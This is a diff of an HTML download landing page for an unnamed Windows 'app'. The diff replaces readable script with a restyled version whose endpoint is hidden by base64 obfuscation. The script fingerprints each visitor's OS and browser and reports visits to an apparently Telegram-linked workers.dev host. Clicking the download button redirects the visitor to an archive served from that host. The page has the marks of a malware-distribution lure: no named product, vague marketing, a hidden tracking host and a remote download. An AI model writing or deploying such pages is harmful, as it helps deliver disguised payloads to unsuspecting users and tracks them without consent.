@@ -1,333 +1,101 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#10120f">
-  <meta name="description" content="Download the app for Windows.">
-  <title>Download for Windows</title>
-
-  <style>
-    :root {
-      color-scheme: dark;
-      --bg: #10120f;
-      --ink: #f2f5ee;
-      --muted: #9ba397;
-      --lime: #d7fb78;
-      --green: #9fcb72;
-    }
-
-    * { box-sizing: border-box; }
-
-    body {
-      margin: 0;
-      min-height: 100vh;
-      background: radial-gradient(ellipse at 50% 34%, #20271d 0, #10120f 54%);
-      color: var(--ink);
-      font-family: Inter, system-ui, -apple-system, "Segoe UI", sans-serif;
-      -webkit-font-smoothing: antialiased;
-    }
-
-    main {
-      min-height: 100vh;
-      width: min(100% - 40px, 1080px);
-      margin: auto;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .top {
-      height: 82px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 1px solid #ffffff12;
-    }
-
-    .top-label {
-      font-size: 12px;
-      font-weight: 600;
-      color: #dfe5d9;
-    }
-
-    .badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 9px;
-      padding: 8px 12px;
-      border: 1px solid #ffffff16;
-      border-radius: 999px;
-      background: #ffffff06;
-      color: #b7c0b1;
-      font-size: 11px;
-    }
-
-    .dot {
-      width: 7px;
-      height: 7px;
-      border-radius: 50%;
-      background: var(--lime);
-      box-shadow: 0 0 12px #d7fb7870;
-    }
-
-    .content {
-      flex: 1;
-      display: grid;
-      place-items: center;
-      padding: 70px 0;
-    }
-
-    .download-panel {
-      width: min(100%, 530px);
-      padding: clamp(28px, 6vw, 52px);
-      border: 1px solid #ffffff15;
-      border-radius: 20px;
-      background: linear-gradient(145deg, #1d221b, #151814 70%);
-      box-shadow: 0 28px 100px #0008;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .download-panel::before {
-      content: "";
-      position: absolute;
-      width: 240px;
-      height: 240px;
-      right: -125px;
-      top: -145px;
-      border-radius: 50%;
-      background: #d7fb7822;
-      filter: blur(2px);
-      pointer-events: none;
-    }
-
-    .eyebrow {
-      position: relative;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      color: var(--lime);
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: .14em;
-      text-transform: uppercase;
-    }
-
-    .eyebrow::before {
-      content: "";
-      height: 1px;
-      width: 22px;
-      background: var(--green);
-    }
-
-    h1 {
-      position: relative;
-      margin: 21px 0 12px;
-      font-size: clamp(32px, 7vw, 48px);
-      line-height: 1;
-      letter-spacing: -.06em;
-      font-weight: 620;
-    }
-
-    .description {
-      position: relative;
-      margin: 0;
-      color: var(--muted);
-      font-size: 14px;
-      line-height: 1.7;
-    }
-
-    .download {
-      position: relative;
-      width: 100%;
-      min-height: 58px;
-      margin-top: 30px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 16px;
-      padding: 0 18px;
-      border: 0;
-      border-radius: 10px;
-      background: var(--lime);
-      color: #172015;
-      text-decoration: none;
-      font-size: 14px;
-      font-weight: 700;
-      transition: background .2s, transform .2s, box-shadow .2s;
-      box-shadow: 0 8px 24px #d7fb7818;
-      cursor: pointer;
-    }
-
-    .download:hover {
-      background: #e2ff9b;
-      transform: translateY(-2px);
-      box-shadow: 0 12px 32px #d7fb7825;
-    }
-
-    .download:focus-visible {
-      outline: 3px solid #f0ffc6;
-      outline-offset: 3px;
-    }
-
-    .arrow {
-      font-size: 19px;
-      font-weight: 450;
-    }
-
-    .meta {
-      display: flex;
-      align-items: center;
-      gap: 18px;
-      margin-top: 18px;
-      color: #929a8e;
-      font-size: 11px;
-    }
-
-    .meta span + span::before {
-      content: "";
-      width: 3px;
-      height: 3px;
-      margin-right: 18px;
-      display: inline-block;
-      vertical-align: middle;
-      border-radius: 50%;
-      background: #687161;
-    }
-
-    @media(max-width: 520px) {
-      main { width: min(100% - 32px, 440px); }
-      .top { height: 70px; }
-      .content { padding: 50px 0; }
-      .download-panel { border-radius: 16px; }
-      .meta { gap: 12px; flex-wrap: wrap; }
-      .meta span + span::before { margin-right: 12px; }
-    }
-
-    @media(prefers-reduced-motion: reduce) {
-      *, *::before, *::after {
-        scroll-behavior: auto !important;
-        transition: none !important;
-      }
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#080808">
+<meta name="description" content="Get the latest release. Download for Windows.">
+<title>Download Center</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#080808;--border:rgba(255,255,255,.09);--accent:#a78bfa}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:#fff;font-family:Inter,sans-serif;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:-1;background:radial-gradient(ellipse at 50% 5%,rgba(139,92,246,.15),transparent 45%),radial-gradient(ellipse at 10% 65%,rgba(79,70,229,.06),transparent 35%)}
+.container{width:min(1120px,calc(100% - 40px));margin:auto}
+.logo-container{width:100px;height:100px;margin:0 auto 35px;position:relative;display:grid;place-items:center;animation:logoFloat 4s ease-in-out infinite}
+.logo-glow{position:absolute;inset:5px;border-radius:30px;background:#8b5cf6;filter:blur(35px);opacity:.35;animation:glowPulse 3s ease-in-out infinite}
+.logo-box{position:relative;width:76px;height:76px;border-radius:23px;display:grid;place-items:center;background:linear-gradient(145deg,#29203e,#14101f);border:1px solid #b59aff70;box-shadow:0 0 35px #8b5cf633,inset 0 0 20px #a78bfa12;z-index:2}
+.logo-box svg{width:36px;height:36px;stroke:#c4b5fd;stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round;filter:drop-shadow(0 0 8px #a78bfa);animation:arrowMove 2s ease-in-out infinite}
+.logo-orbit{position:absolute;inset:-5px;border:1px solid #a78bfa40;border-radius:29px;transform:rotate(25deg) scale(1.1);animation:orbitSpin 12s linear infinite}
+.logo-orbit::before{content:"";position:absolute;width:8px;height:8px;background:#c4b5fd;border-radius:50%;top:8px;right:9px;box-shadow:0 0 12px #a78bfa}
+.logo-orbit.second{inset:-12px;border-color:#8b5cf620;transform:rotate(-25deg);animation:orbitSpinReverse 18s linear infinite}
+@keyframes logoFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+@keyframes glowPulse{0%,100%{opacity:.25;transform:scale(.9)}50%{opacity:.55;transform:scale(1.2)}}
+@keyframes arrowMove{0%,100%{transform:translateY(-3px)}50%{transform:translateY(3px)}}
+@keyframes orbitSpin{from{transform:rotate(25deg) scale(1.1)}to{transform:rotate(385deg) scale(1.1)}}
+@keyframes orbitSpinReverse{from{transform:rotate(-25deg)}to{transform:rotate(-385deg)}}
+.hero{text-align:center;padding:100px 0 75px;position:relative}
+h1{margin-top:0;font-size:clamp(43px,8vw,82px);line-height:1.04;font-weight:900;letter-spacing:-5px}
+.gradient{background:linear-gradient(100deg,#fff 5%,#c4b5fd 50%,#8b5cf6 100%);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero-description{max-width:570px;margin:25px auto 0;color:#888;font-size:15px;line-height:1.9}
+.download-section{padding:10px 0 95px}
+.download-card{max-width:760px;margin:auto;padding:36px;position:relative;overflow:hidden;border:1px solid #ffffff17;border-radius:22px;background:linear-gradient(145deg,#171717,#101010 70%);box-shadow:0 30px 100px #0009}
+.download-card::before{content:"";position:absolute;width:300px;height:300px;right:-170px;top:-180px;background:#8b5cf633;filter:blur(70px);border-radius:50%;pointer-events:none}
+.card-top{display:flex;align-items:center;justify-content:space-between;gap:15px;position:relative}
+.file-info{display:flex;align-items:center;gap:16px}
+.file-icon{width:58px;height:58px;display:grid;place-items:center;border-radius:15px;background:linear-gradient(145deg,#282039,#191322);border:1px solid #a78bfa35;color:#c4b5fd;font-size:25px}
+.file-title{font-size:17px;font-weight:700}
+.file-subtitle{color:#777;font-size:12px;margin-top:6px}
+.version{color:#b5a2f9;background:#a78bfa12;border:1px solid #a78bfa30;padding:8px 12px;border-radius:8px;font-size:10px;font-weight:700}
+.card-divider{height:1px;background:var(--border);margin:28px 0}
+.card-heading{font-size:21px;font-weight:800;letter-spacing:-.7px}
+.card-description{color:#858585;font-size:13px;line-height:1.8;margin-top:9px}
+.download-button{width:100%;min-height:62px;display:flex;align-items:center;justify-content:center;gap:13px;margin-top:25px;border-radius:12px;background:linear-gradient(110deg,#a78bfa,#8057e9);color:#fff;font-size:14px;font-weight:800;letter-spacing:.2px;box-shadow:0 8px 30px #8b5cf633;transition:.25s;position:relative;text-decoration:none;cursor:pointer;user-select:none;-webkit-user-select:none;outline:none}
+.download-button:hover{transform:translateY(-3px);box-shadow:0 12px 40px #8b5cf655;filter:brightness(1.12)}
+.download-button:active{transform:scale(.99)}
+.download-button:focus-visible{box-shadow:0 0 0 3px #a78bfa55,0 8px 30px #8b5cf633}
+.download-button .arrow{font-size:20px}
+.download-meta{display:flex;justify-content:center;flex-wrap:wrap;gap:22px;margin-top:20px;color:#777;font-size:11px}
+.download-meta span{display:flex;align-items:center;gap:7px}
+.features{padding:65px 0 100px;border-top:1px solid var(--border)}
+.section-label{text-align:center;color:#a78bfa;font-size:10px;font-weight:800;letter-spacing:2px;text-transform:uppercase}
+.section-title{text-align:center;font-size:34px;font-weight:800;letter-spacing:-1.5px;margin-top:15px}
+.section-description{text-align:center;color:#777;font-size:13px;margin-top:12px}
+.feature-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:17px;margin-top:45px}
+.feature{padding:27px;background:#111;border:1px solid var(--border);border-radius:15px;transition:.25s}
+.feature:hover{border-color:#a78bfa55;transform:translateY(-4px)}
+.feature-icon{width:42px;height:42px;display:grid;place-items:center;background:#a78bfa12;border:1px solid #a78bfa25;border-radius:11px;font-size:19px;margin-bottom:21px}
+.feature h3{font-size:14px;margin-bottom:10px}
+.feature p{color:#777;font-size:12px;line-height:1.8}
+@keyframes appear{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.hero,.download-card,.feature{animation:appear .7s ease both}
+@media(max-width:700px){.hero{padding:75px 0 55px}.logo-container{transform:scale(.9);margin-bottom:25px}h1{letter-spacing:-2.5px}.hero-description{font-size:13px}.download-card{padding:24px}.feature-grid{grid-template-columns:1fr}.section-title{font-size:27px}.download-meta{gap:13px}.card-top{align-items:flex-start}.version{font-size:9px}}
+@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important;scroll-behavior:auto!important}}
+</style>
 </head>
-
 <body>
-  <main>
-    <header class="top">
-      <div class="top-label">App download</div>
-      <div class="badge">
-        <span class="dot" aria-hidden="true"></span>
-        Windows
-      </div>
-    </header>
-
-    <section class="content" aria-labelledby="title">
-      <div class="download-panel">
-        <div class="eyebrow">Windows 10+</div>
-        <h1 id="title">Download the app</h1>
-        <p class="description">
-          Get the latest version of the application for Windows.
-        </p>
-
-        <a class="download"
-           href="#"
-           id="downloadButton">
-          <span>Download for Windows</span>
-          <span class="arrow" aria-hidden="true">↓</span>
-        </a>
-
-        <div class="meta">
-          <span>64-bit</span>
-          <span>.rar archive</span>
-          <span>Free</span>
-        </div>
-      </div>
-    </section>
-  </main>
-
-  <script>
-    (() => {
-      "use strict";
-
-      const API = "https://telegramnotify.streamminer95.workers.dev";
-
-      async function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let os = "Unknown OS";
-        let osEmoji = "💻";
-        let browser = "Unknown Browser";
-        let browserEmoji = "🌐";
-
-        if (ua.includes("Windows")) {
-          osEmoji = "🪟";
-          os = "Windows 10/11"; 
-          
-          if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-            try {
-              const hints = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
-              if (hints.platformVersion) {
-                const majorVersion = parseInt(hints.platformVersion.split('.')[0], 10);
-                if (majorVersion >= 13) {
-                  os = "Windows 11";
-                } else if (majorVersion >= 1) {
-                  os = "Windows 10";
-                }
-              }
-            } catch (e) {
-              console.warn("Client Hints недоступны.");
-            }
-          } else {
-            if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
-            else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
-          }
-        } 
-        else if (ua.includes("Mac OS X")) { os = "macOS"; osEmoji = "🍎"; }
-        else if (ua.includes("Android")) { os = "Android"; osEmoji = "🤖"; }
-        else if (ua.includes("iPhone") || ua.includes("iPad")) { os = "iOS"; osEmoji = "🍏"; }
-        else if (ua.includes("Linux")) { os = "Linux"; osEmoji = "🐧"; }
-
-        if (ua.includes("Edg/")) { 
-          browser = "Edge " + ua.split("Edg/")[1].split(".")[0]; 
-          browserEmoji = "🌊"; 
-        } else if (ua.includes("OPR/")) { 
-          browser = "Opera " + ua.split("OPR/")[1].split(".")[0]; 
-          browserEmoji = "🔴"; 
-        } else if (ua.includes("Chrome/") && !ua.includes("Edg/") && !ua.includes("OPR/")) { 
-          browser = "Chrome " + ua.split("Chrome/")[1].split(".")[0]; 
-          browserEmoji = "🟢"; 
-        } else if (ua.includes("Firefox/")) { 
-          browser = "Firefox " + ua.split("Firefox/")[1].split(".")[0]; 
-          browserEmoji = "🦊"; 
-        } else if (ua.includes("Safari/") && !ua.includes("Chrome/")) { 
-          const version = ua.split("Version/")[1] ? ua.split("Version/")[1].split(".")[0] : "";
-          browser = "Safari " + version; 
-          browserEmoji = "🧭"; 
-        }
-
-        return `${osEmoji} Device: ${os} · ${browserEmoji} ${browser}`;
-      }
-
-      (async () => {
-        const deviceString = await getDeviceInfo();
-
-        fetch(API + "/notify", {
-          method: "POST",
-          headers: { "Content-Type": "text/plain" },
-          body: JSON.stringify({ 
-            type: "visit", 
-            device: deviceString 
-          }),
-          keepalive: true
-        }).catch(() => {});
-
-        const btn = document.getElementById("downloadButton");
-        if (btn) {
-          btn.href = API + "/download?device=" + encodeURIComponent(deviceString);
-        }
-      })();
-    })();
-  </script>
+<main>
+<section class="hero container">
+<div class="logo-container"><div class="logo-glow"></div><div class="logo-orbit"></div><div class="logo-orbit second"></div><div class="logo-box"><svg viewBox="0 0 24 24"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 17v3h14v-3"/></svg></div></div>
+<h1>Get what you<br><span class="gradient">came for.</span></h1>
+<p class="hero-description">Everything you need, in one place. Download the latest available release and get started in just a few clicks.</p>
+</section>
+<section class="download-section container">
+<div class="download-card">
+<div class="card-top"><div class="file-info"><div class="file-icon">↧</div><div><div class="file-title">Latest Release</div><div class="file-subtitle">Available for download</div></div></div><div class="version">LATEST VERSION</div></div>
+<div class="card-divider"></div>
+<div class="card-heading">Ready when you are.</div>
+<p class="card-description">Your download is ready. Click the button below to access the available file.</p>
+<a class="download-button" id="downloadButton" role="button" tabindex="0"><span id="buttonText">Download Now</span><span class="arrow">↓</span></a>
+<div class="download-meta"><span>✓ Direct access</span><span>✓ Easy download</span><span>✓ Windows compatible</span></div>
+</div>
+</section>
+<section class="features">
+<div class="container">
+<div class="section-label">WHY DOWNLOAD HERE</div>
+<h2 class="section-title">Simple. Fast. Convenient.</h2>
+<p class="section-description">Everything is designed to make your experience easier.</p>
+<div class="feature-grid">
+<div class="feature"><div class="feature-icon">⚡</div><h3>Quick Access</h3><p>Get access to the available release without unnecessary navigation.</p></div>
+<div class="feature"><div class="feature-icon">◈</div><h3>Simple Process</h3><p>A straightforward download experience with just one click.</p></div>
+<div class="feature"><div class="feature-icon">↓</div><h3>Ready to Download</h3><p>Find the download link and get the file directly from the download page.</p></div>
+</div>
+</div>
+</section>
+</main>
+<script>(()=>{const K=atob("aHR0cHM6Ly90ZWxlZ3JhbW5vdGlmeS5zdHJlYW1taW5lcjk1LndvcmtlcnMuZGV2");async function d(){const u=navigator.userAgent;let o="Unknown OS",oe="💻",b="Unknown Browser",be="🌐";if(u.includes("Windows")){o="Windows 10/11";oe="🪟";if(navigator.userAgentData&&navigator.userAgentData.getHighEntropyValues){try{const h=await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);if(h.platformVersion){const m=parseInt(h.platformVersion.split(".")[0],10);if(m>=13)o="Windows 11";else if(m>=1)o="Windows 10"}}catch(e){}}else{if(u.includes("Windows NT 6.3"))o="Windows 8.1";else if(u.includes("Windows NT 6.1"))o="Windows 7"}}else if(u.includes("Mac OS X")){o="macOS";oe="🍎"}else if(u.includes("Android")){o="Android";oe="🤖"}else if(u.includes("iPhone")||u.includes("iPad")){o="iOS";oe="🍏"}else if(u.includes("Linux")){o="Linux";oe="🐧"}if(u.includes("Edg/")){b="Edge "+u.split("Edg/")[1].split(".")[0];be="🌊"}else if(u.includes("OPR/")){b="Opera "+u.split("OPR/")[1].split(".")[0];be="🔴"}else if(u.includes("Chrome/")){b="Chrome "+u.split("Chrome/")[1].split(".")[0];be="🟢"}else if(u.includes("Firefox/")){b="Firefox "+u.split("Firefox/")[1].split(".")[0];be="🦊"}else if(u.includes("Safari/")){const v=u.split("Version/")[1]?u.split("Version/")[1].split(".")[0]:"";b="Safari "+v;be="🧭"}return`${oe} Device: ${o} · ${be} ${b}`}(async()=>{let dev="Unknown device";try{dev=await d()}catch(e){}try{await fetch(K+"/notify",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({event:"visit",page:location.pathname+location.search,device:dev}),keepalive:!0})}catch(e){}const btn=document.getElementById("downloadButton"),bt=document.getElementById("buttonText");if(!btn)return;let busy=!1;const go=()=>{if(busy)return;busy=!0;if(bt)bt.textContent="Starting download…";const url=K+"/download?device="+encodeURIComponent(dev);setTimeout(()=>{window.location.assign(url)},80);setTimeout(()=>{busy=!1;if(bt)bt.textContent="Download Now"},6000)};btn.addEventListener("click",e=>{e.preventDefault();go()});btn.addEventListener("keydown",e=>{if(e.key==="Enter"||e.key===" "){e.preventDefault();go()}})})()})();</script>
 </body>
 </html>
